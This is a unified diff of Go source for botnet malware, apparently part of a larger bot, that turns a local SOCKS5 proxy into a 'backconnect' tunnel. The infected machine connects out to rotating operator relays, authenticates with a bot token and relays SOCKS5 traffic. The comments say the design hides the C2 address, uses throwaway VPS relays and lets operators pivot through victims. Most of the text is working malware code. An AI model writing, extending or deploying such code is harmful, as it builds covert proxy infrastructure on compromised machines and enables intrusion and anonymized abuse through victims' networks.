@@ -1,27 +1,102 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"io"
+	"math/rand"
 	"net"
 	"strconv"
+	"strings"
 	"sync/atomic"
 	"time"
 )
 
 // ============================================================================
-// SOCKS5 PROXY FUNCTIONS
-// Implements a SOCKS5 proxy server for pivoting/tunneling through the bot.
+// BACKCONNECT SOCKS5 PROXY
+//
+// Instead of opening a local listener (which exposes the bot), the bot
+// connects OUT to a relay server. The relay accepts SOCKS5 clients on its
+// public port and bridges them through to the bot via backconnect tunnels.
+// The bot runs the full SOCKS5 protocol over each tunnel.
+//
+// Flow:
+//   Client → [SOCKS5] → Relay ←──[backconnect TLS]──← Bot → Target
+//
+// Multiple relay endpoints are supported. On reconnect the bot rotates
+// through all configured relays, falling back to the next one when the
+// current one is unreachable. The order is shuffled on startup so
+// different bots spread across relays.
+//
+// Benefits:
+//   - Bot never opens an inbound port
+//   - C2 address is not exposed (relay is separate infrastructure)
+//   - Relay can be on a throwaway VPS
+//   - Automatic failover across multiple relays
 // ============================================================================
 
-// muddywater starts a SOCKS5 proxy server on the specified port.
-// Limits concurrent connections to maxSessions (100) to prevent resource exhaustion.
+// activeRelay stores the relay address that cozyBear is currently connected to
+// so that fancyBear can open data connections to the same relay.
+// Protected by lazarusMutex.
+var activeRelay string
+
+// muddywater starts a backconnect SOCKS5 session to one or more relay servers.
+// The bot connects OUT to the first reachable relay and waits for client sessions.
+// On disconnect it rotates to the next relay in the list.
 // Parameters:
-//   - port: TCP port to bind the SOCKS5 proxy to
+//   - relays: One or more relay addresses in host:port format
 //   - c2Conn: C2 connection (unused, kept for interface consistency)
 //
-// Returns: error if proxy already running or port binding fails
-func muddywater(port string, c2Conn net.Conn) error {
+// Returns: error if already running or no valid addresses
+func muddywater(relays []string, c2Conn net.Conn) error {
+	lazarusMutex.Lock()
+	defer lazarusMutex.Unlock()
+	if lazarusActive {
+		return fmt.Errorf("SOCKS backconnect already running")
+	}
+	// Validate at least one address
+	valid := make([]string, 0, len(relays))
+	for _, r := range relays {
+		if _, _, err := scarcruft(r); err == nil {
+			valid = append(valid, r)
+		}
+	}
+	if len(valid) == 0 {
+		return fmt.Errorf("no valid relay addresses")
+	}
+	lazarusActive = true
+	lazarusStopCh = make(chan struct{})
+	atomic.StoreInt32(&lazarusCount, 0)
+	go cozyBear(valid)
+	return nil
+}
+
+// emotet stops the SOCKS5 proxy (both direct and backconnect modes).
+func emotet() {
+	lazarusMutex.Lock()
+	defer lazarusMutex.Unlock()
+	if lazarusActive && lazarusStopCh != nil {
+		close(lazarusStopCh)
+	}
+	if lazarusListener != nil {
+		lazarusListener.Close()
+		lazarusListener = nil
+	}
+	lazarusActive = false
+	activeRelay = ""
+}
+
+// ============================================================================
+// DIRECT MODE — local SOCKS5 listener (no relay needed)
+// Used when operator sends !socks <port> (just a port number).
+// Bot opens a SOCKS5 listener directly on 0.0.0.0:<port>.
+// ============================================================================
+
+// lazarusListener holds the direct-mode TCP listener (nil in backconnect mode).
+var lazarusListener net.Listener
+
+// turmoil starts a direct SOCKS5 proxy listener on the specified port.
+func turmoil(port string, c2Conn net.Conn) error {
 	lazarusMutex.Lock()
 	defer lazarusMutex.Unlock()
 	if lazarusActive {
@@ -37,18 +112,18 @@ func muddywater(port string, c2Conn net.Conn) error {
 	}
 	lazarusListener = listener
 	lazarusActive = true
+	lazarusStopCh = make(chan struct{})
 	atomic.StoreInt32(&lazarusCount, 0)
 	go func() {
 		for {
 			conn, err := listener.Accept()
 			if err != nil {
-				lazarusMutex.Lock()
-				running := lazarusActive
-				lazarusMutex.Unlock()
-				if running {
+				select {
+				case <-lazarusStopCh:
+					return
+				default:
 					continue
 				}
-				return
 			}
 			if atomic.LoadInt32(&lazarusCount) >= maxSessions {
 				conn.Close()
@@ -64,23 +139,196 @@ func muddywater(port string, c2Conn net.Conn) error {
 	return nil
 }
 
-// emotet stops the running SOCKS5 proxy server.
-// Closes the listener and marks proxy as inactive.
-func emotet() {
-	lazarusMutex.Lock()
-	defer lazarusMutex.Unlock()
-	if lazarusListener != nil {
-		lazarusListener.Close()
-		lazarusListener = nil
+// ============================================================================
+// BACKCONNECT MODE — bot connects OUT to relay
+// ============================================================================
+
+// cozyBear maintains the backconnect control connection to the relay pool.
+// Authenticates with syncToken, then waits for RELAY_NEW signals.
+// On disconnect, rotates to the next relay in the list.
+// Shuffles order initially so bots spread across relays.
+func cozyBear(relays []string) {
+	// Shuffle so different bots hit different relays first
+	shuffled := make([]string, len(relays))
+	copy(shuffled, relays)
+	rand.Shuffle(len(shuffled), func(i, j int) {
+		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
+	})
+
+	idx := 0           // current position in shuffled list
+	consecutive := 0   // consecutive failures across full rotation
+	backoff := 5 * time.Second
+
+	for {
+		select {
+		case <-lazarusStopCh:
+			deoxys("cozyBear: Stop signal received, exiting")
+			return
+		default:
+		}
+
+		relayAddr := shuffled[idx%len(shuffled)]
+		host, port, _ := scarcruft(relayAddr)
+
+		deoxys("cozyBear: Trying relay %s (%d/%d)", relayAddr, (idx%len(shuffled))+1, len(shuffled))
+		conn, err := gamaredon(host, port)
+		if err != nil {
+			deoxys("cozyBear: Relay %s failed: %v", relayAddr, err)
+			idx++
+			consecutive++
+			// If we've failed a full rotation, backoff before retrying
+			if consecutive >= len(shuffled) {
+				consecutive = 0
+				deoxys("cozyBear: All %d relays failed, backing off %v", len(shuffled), backoff)
+				select {
+				case <-lazarusStopCh:
+					return
+				case <-time.After(backoff):
+				}
+				// Increase backoff up to 60s
+				if backoff < 60*time.Second {
+					backoff = backoff * 2
+					if backoff > 60*time.Second {
+						backoff = 60 * time.Second
+					}
+				}
+			} else {
+				// Quick retry on next relay (small jitter)
+				select {
+				case <-lazarusStopCh:
+					return
+				case <-time.After(time.Duration(500+rand.Intn(1500)) * time.Millisecond):
+				}
+			}
+			continue
+		}
+
+		// Connected — reset backoff
+		consecutive = 0
+		backoff = 5 * time.Second
+
+		// Authenticate with relay
+		authLine := fmt.Sprintf("RELAY_AUTH:%s:%s\n", syncToken, cachedBotID)
+		conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+		if _, err := conn.Write([]byte(authLine)); err != nil {
+			conn.Close()
+			idx++
+			continue
+		}
+		conn.SetWriteDeadline(time.Time{})
+
+		reader := bufio.NewReader(conn)
+		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
+		resp, err := reader.ReadString('\n')
+		if err != nil || strings.TrimSpace(resp) != "RELAY_OK" {
+			deoxys("cozyBear: Relay %s auth rejected", relayAddr)
+			conn.Close()
+			idx++
+			continue
+		}
+		conn.SetReadDeadline(time.Time{})
+		deoxys("cozyBear: Authenticated with relay %s", relayAddr)
+
+		// Store active relay so fancyBear knows where to open data connections
+		lazarusMutex.Lock()
+		activeRelay = relayAddr
+		lazarusMutex.Unlock()
+
+		// Keepalive writer — sends periodic pings so relay detects us
+		keepaliveDone := make(chan struct{})
+		go func() {
+			defer close(keepaliveDone)
+			ticker := time.NewTicker(60 * time.Second)
+			defer ticker.Stop()
+			for {
+				select {
+				case <-lazarusStopCh:
+					conn.Close()
+					return
+				case <-ticker.C:
+					conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+					if _, err := conn.Write([]byte("RELAY_PING\n")); err != nil {
+						conn.Close()
+						return
+					}
+					conn.SetWriteDeadline(time.Time{})
+				}
+			}
+		}()
+
+		// Read loop — wait for RELAY_NEW signals from relay
+		for {
+			conn.SetReadDeadline(time.Now().Add(5 * time.Minute))
+			line, err := reader.ReadString('\n')
+			if err != nil {
+				deoxys("cozyBear: Control read error on %s: %v", relayAddr, err)
+				break
+			}
+			line = strings.TrimSpace(line)
+			if strings.HasPrefix(line, "RELAY_NEW:") {
+				sessionID := strings.TrimPrefix(line, "RELAY_NEW:")
+				if atomic.LoadInt32(&lazarusCount) < maxSessions {
+					atomic.AddInt32(&lazarusCount, 1)
+					go fancyBear(relayAddr, sessionID)
+				}
+			}
+		}
+
+		conn.Close()
+		<-keepaliveDone
+
+		lazarusMutex.Lock()
+		activeRelay = ""
+		lazarusMutex.Unlock()
+
+		// Move to next relay on disconnect
+		idx++
+		deoxys("cozyBear: Disconnected from %s, rotating to next relay", relayAddr)
+
+		select {
+		case <-lazarusStopCh:
+			return
+		case <-time.After(time.Duration(1000+rand.Intn(2000)) * time.Millisecond):
+		}
 	}
-	lazarusActive = false
+}
+
+// fancyBear opens a data connection to the relay for a single SOCKS5 session.
+// Sends the session ID, then runs the full SOCKS5 protocol (trickbot).
+func fancyBear(relayAddr, sessionID string) {
+	defer atomic.AddInt32(&lazarusCount, -1)
+
+	host, port, err := scarcruft(relayAddr)
+	if err != nil {
+		return
+	}
+
+	conn, err := gamaredon(host, port)
+	if err != nil {
+		deoxys("fancyBear: Data connection failed: %v", err)
+		return
+	}
+
+	// Identify as data channel
+	conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	if _, err := conn.Write([]byte("RELAY_DATA:" + sessionID + "\n")); err != nil {
+		conn.Close()
+		return
+	}
+	conn.SetWriteDeadline(time.Time{})
+
+	deoxys("fancyBear: Data channel established for session %s", sessionID)
+
+	// Run SOCKS5 protocol — from the bot's perspective this is just
+	// a regular SOCKS5 client connection tunneled through the relay
+	trickbot(conn)
 }
 
 // trickbot handles a single SOCKS5 client connection.
-// Implements SOCKS5 protocol: version negotiation -> connection request -> relay.
+// Implements SOCKS5 protocol: version negotiation -> auth -> connection request -> relay.
 // Supports address types: IPv4 (0x01), domain (0x03), IPv6 (0x04)
 // Parameters:
-//   - clientConn: Incoming SOCKS5 client connection
+//   - clientConn: SOCKS5 client connection (direct or via relay tunnel)
 func trickbot(clientConn net.Conn) {
 	defer clientConn.Close()
 	clientConn.SetDeadline(time.Now().Add(30 * time.Second))
